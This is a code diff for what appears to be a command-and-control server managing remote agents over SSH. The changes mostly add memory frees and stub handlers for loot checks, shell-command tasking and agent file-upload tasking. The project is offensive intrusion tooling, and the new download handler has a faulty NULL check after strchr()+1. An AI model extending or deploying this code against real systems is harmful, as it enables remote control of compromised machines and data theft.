@@ -159,6 +159,7 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
             ip = misc_substring(arg, dbg, strlen(arg));
         
             agent_compile(ip, port);
+            free(ip);
             break;
         case 'i':
             halt = 1;
@@ -172,6 +173,7 @@ static error_t parse_opt (int key, char *arg, struct argp_state *state) {
 
             agent_register(id, pass);
             printf("Registered agent with %s and %s\n", id, pass);
+            free(id);
             break;
         case ARGP_KEY_ARG:
             if (state->arg_num >= 1) {
@@ -214,6 +216,7 @@ void manager_handler(struct clientNode *node){
     int ctr = 0;
     char *ptr = NULL;
     char *dat_ptr = NULL;
+    char *d_ptr = NULL;
     char buff[BUFSIZ];
     char data_buffer[BUFSIZ];
     char tmpbuffer[8];
@@ -270,9 +273,6 @@ void manager_handler(struct clientNode *node){
             pthread_mutex_lock(&session_lock);
             list_remove_node(node);
             pthread_mutex_unlock(&session_lock);
-            ssh_channel_close(manager->chan);
-            ssh_free(manager->session);
-            printf("Manager %s: Client exiting...\n", manager->id); 
             quitting = 1;
             break;
 
@@ -352,6 +352,7 @@ void manager_handler(struct clientNode *node){
                             memset(tmp_ptr, 0, size);
                             fread(tmp_ptr, 1, size, file);
                             char *tmp_ptr2 = b64_encode((unsigned char*)tmp_ptr, size);
+                            free(tmp_ptr);
                             memset(buff, 0, 256);
                             sprintf(buff, "%d", size_e);
                             
@@ -369,6 +370,7 @@ void manager_handler(struct clientNode *node){
                             
                             rc = ssh_channel_write(manager->chan, tmp_ptr2, strlen(tmp_ptr2));
                             fclose(file);
+                            free(tmp_ptr2);
 
                             if (ctr >= count)
                             {
@@ -458,8 +460,10 @@ void manager_handler(struct clientNode *node){
             char *temp = malloc(size_e);
             if(!b64_decode(data_ptr, (unsigned char*)temp, size_e)){
                 printf("Manager %s: failed to decode data\n", manager->id);
+                free(data_ptr);
                 return;
             }
+            free(data_ptr);
             
             // writes file 
             rc = ssh_channel_write(manager->chan, "ok", 3);
@@ -477,16 +481,13 @@ void manager_handler(struct clientNode *node){
             }
             fwrite(temp, 1, size_e, file);
             fclose(file);
+            free(temp);
 
             agent_task(AGENT_DOWN_FILE, ptr, filename);
             break;
 
         case MANAG_REQ_RVSH:
             printf("Manager shell command caught\n");
-            break;
-
-        case AGENT_REV_SHELL:
-            printf("Manager reverse shell caught\n");
             break;
 
         case MANAG_TASK_MODULE:
@@ -522,6 +523,38 @@ void manager_handler(struct clientNode *node){
 
             printf("Manager %s: Execution of module ended with exit code %s\n", manager->id, tmpbuffer);
 
+            break;
+
+        case MANAG_CHECK_LOOT:
+            printf("Caught loot check call\n");
+            break;
+
+        case MANAG_DOWN_FILE:
+            printf("Caught download tasking call\n");
+
+            // requested agent and filename are stored in ptr
+            // by the end, filename is in d_ptr and agent is in dat_ptr
+            d_ptr = strchr(ptr, ':') +1;
+            if(d_ptr == NULL){
+                printf("Wrong format identified from input\n");
+                return;
+            }
+            count = misc_index_of(ptr, ':', 0);
+            dat_ptr = misc_substring(ptr, count, strlen(ptr));
+            agent_task(AGENT_UP_FILE, dat_ptr, d_ptr);
+            ssh_channel_write(manager->chan, "ok", 2);
+            break;
+
+        case MANAG_TASK_SC:
+            printf("Caught shell command tasking request\n");
+            break;
+
+        case MANAG_GET_AGENT:
+            printf("Caught agent creation call\n");
+            break;
+
+        case MANAG_REG_AGENT:
+            printf("Caught agent register call\n");
             break;
 
         case MANAG_GET_INFO:
@@ -699,6 +732,7 @@ void agent_handler(struct clientNode *node){
             file = fopen(filename, "wb");
             fwrite(data_ptr, 1, size, file);
             fclose(file);
+            free(data_ptr);
             break;
 
         case AGENT_EXEC_SC:
@@ -857,11 +891,9 @@ void client_handler(void* sess){
         break;
     }
 
-    printf("Client %s: closing channels...\n", pass->id);
+    printf("Closing channels...\n");
     ssh_message_free(message);
-    ssh_disconnect(pass->session);
-    free(pass);
-
+    
 	
     return;
 }
